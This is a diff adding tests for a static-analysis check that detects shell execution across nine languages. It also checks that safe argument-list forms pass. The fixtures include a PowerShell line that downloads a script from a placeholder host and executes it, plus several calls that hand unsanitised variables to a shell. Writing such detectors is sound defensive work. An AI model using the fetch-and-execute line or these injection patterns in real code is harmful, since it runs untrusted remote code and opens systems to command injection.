@@ -573,3 +573,34 @@ describe("developer tooling no lifecycle hook runs", () => {
     expect(r.status).toBe("fail");
   });
 });
+
+describe("the remaining seven languages", () => {
+  it.each([
+    ["java", "A.java", 'Runtime.getRuntime().exec("sh -c " + cmd);'],
+    ["kotlin", "A.kt", 'ProcessBuilder("/bin/sh", "-c", payload).start()'],
+    ["csharp", "A.cs", 'Process.Start("cmd.exe", "/c " + userInput);'],
+    ["swift", "A.swift", 'task.launchPath = "/bin/sh"'],
+    ["c", "a.c", "system(cmd);"],
+    ["cpp", "a.cpp", 'FILE *f = popen(command, "r");'],
+    ["lua", "a.lua", "os.execute(cmd)"],
+    ["perl", "a.pl", "system($cmd);"],
+    ["powershell", "a.ps1", "iwr https://x.tld/p.ps1 | iex"],
+  ])("catches shell execution in %s", async (_n, path, code) => {
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("fail");
+  });
+
+  it.each([
+    // The same argv rule Go and Rust get: a program plus an argument
+    // LIST never reaches a shell, and it is the form these checks ask
+    // people to use. Flagging it would condemn the correct answer.
+    ["java argv", "A.java", 'Runtime.getRuntime().exec(new String[]{"git", "status"});'],
+    ["kotlin argv", "A.kt", 'ProcessBuilder("git", "status").start()'],
+    ["csharp argv", "A.cs", 'Process.Start("git", "status");'],
+    ["c literal", "a.c", 'system("ls -la");'],
+    ["lua literal", "a.lua", 'os.execute("ls")'],
+  ])("leaves %s alone", async (_n, path, code) => {
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("pass");
+  });
+});
